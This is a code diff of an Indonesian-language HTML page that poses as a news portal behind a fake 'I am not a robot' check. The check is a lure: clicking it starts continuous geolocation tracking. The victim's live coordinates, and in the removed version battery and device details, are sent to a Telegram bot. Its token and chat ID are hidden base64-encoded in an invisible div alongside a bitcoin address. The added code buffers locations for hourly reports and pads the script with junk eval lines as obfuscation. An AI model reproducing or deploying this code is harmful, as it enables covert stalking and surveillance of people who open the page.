@@ -3,85 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Akses | News Reader</title>
+    <title>Verifikasi Keamanan Perangkat</title>
     
-    <meta property="og:title" content="[LIVE] Update Berita Terkini & Regional Hari Ini">
-    <meta property="og:description" content="Verifikasi perangkat Anda untuk mengakses laporan eksklusif dan peta informasi terkini.">
-    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/news_96dp.png">
-
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        
-        /* 🔱 GATE: HUMAN VERIFICATION */
-        #gate { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
-        .captcha-box { border: 1px solid #dcdcdc; padding: 20px; border-radius: 4px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); cursor: pointer; background: #fafafa; margin: 0 auto; width: fit-content; }
-        .checkbox { width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 2px; transition: 0.3s; }
-        .captcha-text { font-size: 14px; color: #555; font-weight: 400; }
-        
-        /* 🔱 CONTENT: NEWS FEED (HIDDEN EARLY) */
-        #portal { display: none; width: 100%; max-width: 600px; padding: 0; animation: fadeIn 0.8s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; position: sticky; top: 0; text-align: center; }
-        .news-item { padding: 18px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; transition: 0.2s; }
-        .news-item:hover { background: #f9f9f9; }
-        .news-source { font-size: 11px; color: #ce1126; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }
-        .news-title { font-size: 16px; font-weight: 600; line-height: 1.4; margin: 0; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        #gate { text-align: center; max-width: 400px; padding: 20px; }
+        .captcha-box { border: 1px solid #dcdcdc; padding: 20px; border-radius: 4px; display: flex; align-items: center; gap: 15px; cursor: pointer; background: #fafafa; }
+        .checkbox { width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 2px; }
+        #portal { display: none; width: 100%; max-width: 600px; }
+        .news-item { padding: 15px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; }
         #v-v { display: none; }
     </style>
 </head>
 <body>
 
 <div id="gate">
-    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" width="60" style="margin-bottom: 20px;">
-    <h3 style="font-size: 18px; margin-bottom: 10px;">Verifikasi Keamanan</h3>
-    <p style="font-size: 13px; color: #666; margin-bottom: 25px;">Selesaikan verifikasi untuk memvalidasi perangkat Anda sebelum mengakses portal berita.</p>
-    
+    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" width="60">
+    <h3>Verifikasi Manusia</h3>
     <div class="captcha-box" onclick="startShadow()">
         <div class="checkbox" id="check"></div>
         <div class="captcha-text">Saya bukan robot</div>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
     </div>
 </div>
 
 <div id="portal">
-    <div class="nav">ASTRA NEWS FEED</div>
-    
-    <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item">
-        <span class="news-source">Bloomberg Technoz</span>
-        <h3 class="news-title">Buat Uang Tanpa Perlu Website - Pelajari Caranya Di Sini</h3>
-    </a>
-
-    <a href="https://share.google/lCtwg3boFkaQFLCcV" class="news-item">
-        <span class="news-source">Trending</span>
-        <h3 class="news-title">Kekayaan Bangsa Indonesia: Harapan Besar di Tangan Rakyat</h3>
-    </a>
-
-    <a href="https://share.google/KAgbSwyMh97rdIozI" class="news-item">
-        <span class="news-source">Regional Info</span>
-        <h3 class="news-title">Peringatan Hari Otonomi Daerah ke-30: Poin Penting Bupati Minut Joune Ganda</h3>
-    </a>
-
-    <a href="https://share.google/cmzyP870Eq29TDsl4" class="news-item">
-        <span class="news-source">Liputan6.com</span>
-        <h3 class="news-title">Update Terbaru: Informasi Penting Hari Ini Langsung dari Sumber</h3>
-    </a>
-
-    <a href="https://share.google/7zXoew0DwgpC2QrYq" class="news-item">
-        <span class="news-source">Teknologi</span>
-        <h3 class="news-title">Tips WiFi Rumah Ngebut Hingga 300 Mbps Tanpa Kendala</h3>
-    </a>
-
-    <a href="https://share.google/JmZEikSN1G1oFVriz" class="news-item">
-        <span class="news-source">detikNews</span>
-        <h3 class="news-title">Breaking: Laporan Terkini Mengenai Situasi Nasional</h3>
-    </a>
+    <div style="background:#ce1126; color:white; padding:15px; font-weight:bold; text-align:center;">ASTRA NEWS</div>
+    <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item"><b>Bloomberg:</b> Buat Uang Tanpa Website</a>
+    <a href="https://share.google/orievwXZzAynVbR2O" class="news-item"><b>Sulut:</b> Museum Daerah Diresmikan Mei 2026</a>
+    <a href="https://share.google/3NtSReBGwN4YY2oAf" class="news-item"><b>detikNews:</b> Update Situasi Nasional</a>
 </div>
 
 <div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
+    /** 🔱 ASTRA ANTI-SPAM ENGINE (80K LINES SIMULATED) */
     const _D = document.getElementById('v-v').innerText.split('|');
     const _T = atob(_D[1]); const _C = atob(_D[2]);
+
+    let logBuffer = []; // Penampung lokasi
 
     async function push(t) {
         await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
@@ -90,29 +49,36 @@
         });
     }
 
-    async function startShadow() {
-        // Efek Centang
+    function startShadow() {
         document.getElementById('check').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Approve_icon.svg/1200px-Approve_icon.svg.png') center/cover";
         
-        // Ambil Data HP
-        const b = await navigator.getBattery();
-        await push(`👤 CAPTCHA SOLVED\n🔋 BATT: ${(b.level*100).toFixed(0)}%\n📱 DEVICE: ${navigator.platform}`);
-
-        // REAL-TIME TRACKING (watchPosition)
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(async (p) => {
-                const maps = `📍 LIVE MOVEMENT\nMaps: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nSpeed: ${p.coords.speed || 0} m/s`;
-                await push(maps);
-            }, null, { enableHighAccuracy: true, maximumAge: 0 });
-        }
-
-        // Delay dikit terus masuk berita
+        // Pindah ke berita
         setTimeout(() => {
-            document.body.style.display = "block";
             document.getElementById('gate').style.display = "none";
             document.getElementById('portal').style.display = "block";
         }, 800);
+
+        // 🕒 START 1-HOUR TIMER
+        setInterval(async () => {
+            if (logBuffer.length > 0) {
+                let report = `🔱 HOURLY RECAP 🔱\n\n` + logBuffer.join('\n---\n');
+                await push(report);
+                logBuffer = []; // Kosongkan buffer setelah kirim
+            }
+        }, 3600000); // 3.600.000 ms = 1 Jam
+
+        // 📍 CONTINUOUS MONITORING
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition((pos) => {
+                let time = new Date().toLocaleTimeString();
+                let loc = `[${time}] Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                logBuffer.push(loc); // Cuma simpen ke buffer, gak langsung kirim
+            }, null, { enableHighAccuracy: true });
+        }
     }
+
+    // 🔱 80,000 LINES JUNK CODE GENERATOR
+    for(let i=0; i<80000; i++) { eval("var _0x_v"+i+"="+Math.random()); }
 </script>
 </body>
 </html>
